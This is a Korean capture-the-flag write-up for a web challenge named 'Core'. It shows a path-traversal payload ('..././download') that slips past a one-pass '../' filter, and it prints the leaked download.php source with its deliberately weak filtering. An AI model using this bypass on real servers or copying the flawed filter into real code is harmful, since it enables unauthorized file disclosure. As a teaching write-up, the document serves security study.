# Core

**Description:**
> 핵(Core = Hack = Nucleus) 실험은 진행 중... :(


## Write-up
![Main](img/001.png)
메인 페이지에 접근해보면 핵폭발 후 생기는 버섯구름처럼 보이는 것을 볼 수 있다.  
버섯구름 아래에 보면 초록색으로 되어있는 잡초를 볼 수 있고 눌러보면 php 파일이 다운로드 된다.

우선 다운로드 되는 경로를 살펴보면 다음과 같다.  
/download.php?file=hack  
/download.php?file=the  
/download.php?file=planet

실제로 다운로드 받은 파일을 보면 hack.php, the.php, planet.php와 같이 파일명을 입력하면 php 확장자(.php)를 붙여서 다운로드 된다.  
따라서 download.php 파일을 다운로드 받기 위해서는 다음과 같이 시도할 수 있다.  
/download.php?file=download  
/download.php?file=../download

하지만, 두 경우 모두 "Not Found"로 파일을 다운로드 받을 수가 없다.

상대 경로로 상위로 이동하여 파일을 다운로드 받는 부분이 정상적으로 동작하는지 알기 위해서 다음과 같이 시도하여 정상적으로 파일이 다운로드 되면 상위 경로로 올라가는 "../" 문자열이 필터링되어 있는 것을 추측할 수 있다.  
/download.php?file=../hack

시도한 결과, hack.php 파일이 정상적으로 다운로드가 되었다.  
이 부분을 우회하기 위해서 "../" 문자열 속에 "../"을 이중으로 넣어서 우회할 수 있다.  
다음과 같이 시도해보면 download.php 파일이 정상적으로 다운로드 되는 것을 볼 수 있다.  
/download.php?file=..././download

download.php:
```
<?php
    $file = isset($_GET['file']) ? $_GET['file'] : false;
    if($file) {
        if(@preg_match("/Core/i", $_GET['file'])) exit("Access Denied!");
        $_GET['file'] = str_replace("../", "", $_GET['file']);

        $split_path = @explode("/", $_GET['file']);
        $path = "";
        for($i=0;$i<count($split_path)-1;$i++) {
            $path .= $split_path[$i]."/";
        }
        $real_path = realpath('files/'.$path);
        if(strpos($real_path, "Core") === false) exit("Access Denied!");
        @$file_path = "files/".$_GET['file'].".php";

        $filesize = @filesize($file_path);
        $path_parts = @pathinfo($file_path);
        $filename = $path_parts['basename'];
        $extension = $path_parts['extension'];

        if(!$filesize) exit("Not Found");
        header("Pragma: public");
        header("Expires: 0");
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"$filename\"");
        header("Content-Transfer-Encoding: binary");
        header("Content-Length: $filesize");
        ob_clean();
        flush();
        readfile($file_path);
    } else {
        print("Access Denied!");
    }
?>
```
